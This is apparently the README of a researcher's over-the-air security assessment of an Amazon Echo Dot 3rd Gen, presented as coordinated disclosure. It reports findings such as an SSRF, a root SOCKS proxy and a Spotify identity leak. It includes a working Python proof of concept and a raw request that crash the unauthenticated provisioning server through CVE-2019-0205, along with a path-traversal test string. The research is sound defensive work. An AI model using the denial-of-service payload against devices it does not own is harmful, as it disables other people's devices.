# Echo Dot 3rd Gen (with clock) — `doebrite` — Software-Only Security Research

> **A complete, reproducible security assessment of an Amazon Echo Dot 3rd Gen
> (codename `doebrite`) performed entirely over the air — Wi-Fi and Bluetooth only,
> no hardware modification, no opening, no UART, no test points, no USB.**
>
> 42 sections of measurements, 5 disclosed findings (one CVE-class), and a
> rigorous demonstration that **no user firmware can be installed on this device
> through its network interfaces** — because the root of trust is cryptographic.

[Français](#résumé-en-français) · [Findings](#findings) · [The wall](#the-wall-why-the-os-cannot-be-changed) · [Repo](#repository-layout)

---

## TL;DR

| | |
|---|---|
| **Device** | Amazon Echo Dot 3rd Gen **with clock** |
| **Codename** | `doebrite` (shared firmware id with `octave` = Echo Studio) |
| **DSN tested** | `G0914705XXXXXXX` |
| **deviceType** | `A30YDR2MK8HMRV` |
| **SoC** | MediaTek **MT8167** · Android 7.1.2 / Fire OS 6 · 32-bit userspace |
| **Constraints** | Wi-Fi + BLE + 2 buttons + power. Nothing else. |
| **Outcome** | **1 pre-auth DoS (CVE-2019-0205), 1 SSRF, 1 root proxy, 1 info leak — no RCE, no root, no firmware install.** |

**Headline finding:** `oobed` (the provisioning server on the setup AP, port 8080)
ships **Apache Thrift 0.9.0**, vulnerable to **CVE-2019-0205**. A single 280 KB
unauthenticated request kills it permanently (`oneshot` service, not restarted).

---

## Device identification

Getting the *right* device mattered: two different products share the same OTA
file name suffix (`0013222532484`).

```
OTA package : update-kindle-doebrite-NS65741_user_8149_0013222532484.bin (117 MB)
              (a decoy exists: update-kindle-octave-… = Echo Studio, 449 MB)
Product     : doebrite  ·  deviceType A30YDR2MK8HMRV
SoC         : MT8167 (13 DTB variants: Crumpet 4, Doebrite 5, Pascal 1, Croissant 3)
Storage     : NAND SLC 4 Gbit (MT29F4G08ABAFAH4) = 512 MiB
System      : squashfs "hsqs" mounted read-only with `verify,slotselect`
              = the *ramdisk* is the system; Android lives in /system
Partitions  : 13 MTD (nvram, proinfo, uboot, uboot2, misc, boot, recovery,
              logo, expdb, seccfg, tee1, tee2, idme_nand) — no swdl/dkernel/factory
Kernel addr : 0x40008000  (widely-cited 0x40080000 is wrong)
```

**Lesson:** a shared identifier is not an identity. We initially analysed the
wrong product's OOBE APK, which led to a false conclusion (`oobed` "does not
exist") that was later corrected by measurement — see `docs/09-methodology.md`.

---

## Attack surface map

Everything below was measured, not assumed.

| Surface | Port / interface | Result |
|---|---|---|
| **LAN scan 1–65535** | — | 7 ports: `1080`, `4070`, `5541`, `8888`, `55442`, `55443`, `55445` |
| **Setup AP scan 1–65535** | `10.201.126.241` | **only `8080`** |
| **OOBE** | `8080` (setup) | 15 Thrift-JSON methods — **CVE-2019-0205 found here** |
| **SOCKS** | `1080` | `/system/bin/socks`, **root**, SOCKS5 with whitelist → denies all |
| **Matter** | `5541` | Commissioned, 3 fuzz vectors, parser robust |
| **Spotify Connect** | `4070` | mDNS `_spotify-connect._tcp`, `CPath=/spotifyConnect` → **info leak** |
| **WHALEXA** | `55443/55445` | mTLS, private CA → `handshake failure` |
| **Bluetooth** | BLE | WhisperJoin service `FE00` — **protocol fully reversed** |
| **Bootloader** | — | `lk`, RSA-PSS verified, 6 boot modes, none usable |
| **USB** | — | **does not physically exist** (power jack + 3.5 mm line-out only) |

---

## Findings

Full detail in [`disclosure/DISCLOSURE_AMAZON.md`](disclosure/DISCLOSURE_AMAZON.md).

### 1. Pre-authentication DoS in `oobed` — Apache Thrift 0.9.0 (CVE-2019-0205) — **High**

```
POST http://10.201.126.241:8080/OOBE      Content-Type: application/x-thrift
[1,"ping",1,1,{"0":{"rec":{…20000 levels deep…}}}]
→ connection dropped, server never answers again
```

| depth | size | result |
|---|---|---|
| 5 000 | 70 KB | 200 OK |
| **20 000** | **280 KB** | **dead, and stays dead** |

The AP stays up; only `oobed` dies. Declared `oneshot`, so init does not restart
it — the provisioning server stays down until a power cycle.

### 2. SSRF in `getLinkCode` — **Medium**

`getLinkCode` (unauthenticated) makes the device open a **TLS connection** to
`persist.oobe.reg.endpoint` : `persist.oobe.compapp.port`. The **host follows DNS**
(a DNS response pointing `api.amazon.com` at `127.0.0.1` is honoured) and the
**port is client-controlled** via `setLocaleAndEndpoints`.

Proof: with host→`127.0.0.1` and port→`8080`, a request through the tunnel
returned the device's *own* OOBE error page (`405 Method Not Allowed`).
Usable as a loopback port oracle; full MITM is blocked by TLS certificate validation.

### 3. `/system/bin/socks` — root SOCKS5 with `iptables` and `system()` — **Medium (latent)**

```
service socks5stream /system/bin/socks -i p2p0 -p 1080
    user root · group root system · disabled · oneshot
```

Accepts SOCKS5, authorises the client **by an ARP-derived MAC** (spoofable),
builds `iptables` rules (`setting Up iptables rule to enable port %u`) and imports
`system()`. Whitelist is empty in normal operation → every `CONNECT` is refused
with a non-standard code `0x09`. No execution obtained; flagged as structural risk.

### 4. `firewall.sh` — unquoted `$P2P_IP` — **Low (latent)**

Root-run script building iptables rules with unquoted expansions. `getRemoteAddr()`
cannot produce shell metacharacters today, so **not currently exploitable** —
but it is one property-write away from root command injection.

### 5. Spotify Connect `getInfo` leaks user identity — **Low (info disclosure)**

```
GET http://<device>:4070/spotifyConnect?action=getInfo    → 200 OK, no auth
{ "deviceID": "...", "publicKey": "...", "clientID": "...",
  "aliases": [ { "name": "<owner's Spotify display name> - Echo Dot" } ] }
```

Any LAN host retrieves the owner's Spotify display name, device id, session public
key and Spotify client id without authentication.

> **Correction notice.** An earlier draft claimed five components lacked stack
> canaries. **That was wrong and is withdrawn.** Re-verification with
> `objdump -d | grep stack_chk_fail@plt` shows canaries are present
> (libSpotifyAdapter 823 call sites, libthrift 302, libdoppleroobe 130,
> libSpotifyAdapterInternal 73, libcivetweb 53). The original check used
> `readelf -s | grep stack_chk_fail`, which missed the versioned symbol.
> No stack-protector finding is reported.

---

## What was tested and found **solid**

Documenting the negatives is as important as the positives.

| Surface | Tests | Result |
|---|---|---|
| Thrift JSON parser | strings 1 B → **1 MiB**, invalid UTF-8, lone surrogates, 50 k escapes, 5 000-digit integers | handled / cleanly rejected |
| civetweb HTTP parser | 20 KB headers, 60 KB URL, absurd/negative/duplicate `Content-Length`, malformed chunked, NUL in path, 10 KB method, 100 headers, `../../etc/passwd` | all graceful (400/405/500) |
| OOBE business fields | SSID 32→16 KiB, locale 32→64 KiB, endpoint 32→64 KiB | validated before use |
| SOCKS5 parser | 6 greeting variants, 11 address types, 5 invalid commands, extreme ports, domain length 0/255 | standard replies `0x07`/`0x08`/`0x09`, no crash |
| Matter | commissioning + 3 fuzz vectors incl. **TLV length desync delivered and ACKed** | stack robust |
| WhisperJoin BLE | full protocol implementation (START → GRANTED, commands, chunked responses) | blocked by CBL cloud authentication (by design) |
| Wi-Fi stack | dnsmasq 2.51, avahi 0.6.31, dhcpcd 6.8.2, EAPOL 7 modes, 802.11 VHT/RSN sweeps | all measured closed |

---

## The wall: why the OS cannot be changed

This is the central result. It is **not** "we didn't find the bug" — it is
"the chain of trust is cryptographic, and no userspace bug can break it".

```
BootROM (in the SoC)  → preloader
Preloader             → lk
lk                    → RSA-PSS (SHA-256, LibTomCrypt) verify of boot/recovery
Kernel                → mounts /system as squashfs ro, dm-verity
```

**What was verified, by disassembly and measurement:**

| Path | Verdict |
|---|---|
| Write `/system` | dm-verity fails → no boot |
| Write `/boot` | RSA-PSS fails → `lk` refuses |
| Write `/misc` (BCB) | `lk` still verifies the target image |
| Downgrade | anti-rollback + per-model signed OTA manifest |
| `swdl` boot mode ("Wifi SWDL Boot Image") | **no `swdl` image exists** on this product (0 occurrences in boot.img, brhgptpl_*, system.img) |
| `dkernel` | same — no image |
| `factory.img` | absent ("factory image doesn't exist in SD card") |
| Fastboot | needs USB — **the Dot 3 has no USB port** |
| ADB | `ro.adb.secure=1`, no `/adb_keys`, no screen to accept the prompt, port never listening |
| ATCI (MediaTek factory test) | binaries `atci_service`/`atcid` **absent** from `/vendor/bin` |
| SELinux | `enforcing`, imposed by `lk`; `ro.boot.selinux=disable` is inert |
| Serial console | none (no UART, no pad) |

**Even root would not be enough.** Root gives the house keys, not the safe's.
The only object that unlocks a firmware replacement is Amazon's RSA private key.

---

## Methodology & lessons

Full write-up in [`docs/09-methodology.md`](docs/09-methodology.md). Highlights:

1. **A positive witness proves the harness, not the vulnerability.** A working
   DNS reply doesn't mean the CVE path was reached.
2. **Two agents on every factual claim.** Three wrong versions of the
   `ro.boot.selinux` question, each resolved by a measurement.
3. **Never conclude absence from a truncated view.** The `readelf` canary mistake
   above is exactly this failure mode — corrected in public.
4. **A shared identifier is not an identity.** Two products share one OTA name.
5. **Measure before/after, never from a single state.** This is how the
   `getLinkCode` SSRF was found (a port opened *because of* the call).
6. **Kill your own leads by measurement, not by argument.** `dhcp-script` was
   compiled out; avahi cannot start with `rlimit-data=4M`; `ansible`-style
   reasoning is not evidence.
7. **An absence is concluded by counting call sites in the disassembly**, never by
   grepping a formatted symbol table.

---

## Repository layout

```
README.md                     ← you are here
docs/
  01-device-identification.md
  02-network-surface.md
  03-oobe-protocol.md
  04-matter.md
  05-ble-whisperjoin.md
  06-bootloader-and-ota.md
  07-spotify-connect.md
  08-findings.md
  09-methodology.md
evidence/
  SYNTHESE.md                 ← the full 42-section measurement log (FR)
disclosure/
  DISCLOSURE_AMAZON.md        ← vendor-ready report (EN)
scripts/
  pi/                         ← setup AP, DNS/DHCP/EAPOL/802.11 harnesses
  ble/                        ← WhisperJoin client (START → GRANTED → commands)
  oobe/                       ← OOBE Thrift-JSON tools, cert exchange
  analysis/                   ← SOCKS fuzzer, Spotify handshake, port scanners
```

### Reproducing the headline finding

```bash
# 1. Connect a host to the device's setup AP ("Amazon-XXXX")
# 2. Send a deeply nested, syntactically valid Thrift-JSON request
python3 - <<'PY'
import json, urllib.request
depth = 20000
body = b'[1,"ping",1,1,' + b'{"0":{"rec":' * depth + b'{}' + b'}}' * depth + b']'
r = urllib.request.Request("http://10.201.126.241:8080/OOBE", data=body,
        headers={"Content-Type": "application/x-thrift"})
try: urllib.request.urlopen(r, timeout=10)
except Exception as e: print("expected:", e)
PY
# 3. Any subsequent request times out. The AP stays up; only oobed is dead.
```

---

## Résumé en français

**Objet :** audit de sécurité complet d'un Echo Dot 3ᵉ génération (avec horloge),
codename `doebrite`, réalisé **uniquement par les ondes** — Wi-Fi et Bluetooth,
sans ouverture, sans UART, sans pastille, sans USB (l'appareil n'en a pas).

**Résultat principal :** un **déni de service pré-authentification** dans le serveur
de provisioning (`oobed`, port 8080 du réseau de configuration), dû à
**Apache Thrift 0.9.0** et à la vulnérabilité **CVE-2019-0205**. Une seule requête
de 280 Ko tue le service, définitivement jusqu'au prochain redémarrage.

**Autres constats :** un SSRF dans `getLinkCode` (hôte et port contrôlés, tunnel
prouvé jusqu'au loopback), un proxy SOCKS5 **root** à whitelist (`/system/bin/socks`),
une injection shell latente dans `firewall.sh`, et une fuite de l'identité Spotify
du propriétaire sans authentification.

**Conclusion :** il n'existe **aucun chemin logiciel** permettant d'installer un
firmware personnel sur cet appareil. Ce n'est pas un manque de recherche : la
chaîne de confiance (RSA-PSS dans `lk`, dm-verity sur `/system`, anti-rollback)
est cryptographique. Même un accès root ne suffirait pas.

---

## Ethics & disclosure

- All testing was performed on **hardware owned by the researcher**.
- No third-party device, account or network was touched.
- The device was **not damaged**, and was restored to factory state.
- Findings are published after vendor notification, in line with coordinated
  disclosure. No exploit code is included — only proof-of-concept harnesses for
  the availability bug and protocol tooling.
- The WhisperJoin material is documented **because the protocol is protected by
  cloud authentication (CBL)**, so the documentation does not enable abuse;
  it explains what the authentication protects.

## License

Documentation: **CC BY 4.0** · Scripts: **MIT** — see [`LICENSE`](LICENSE).

## Credits

Research, harnesses and analysis: the repository author.
Thanks to the open-source projects whose implementations made the protocol work
tractable: **librespot** (Spotify Connect reference) and **connectedhomeip**
(Matter). Neither is redistributed here.
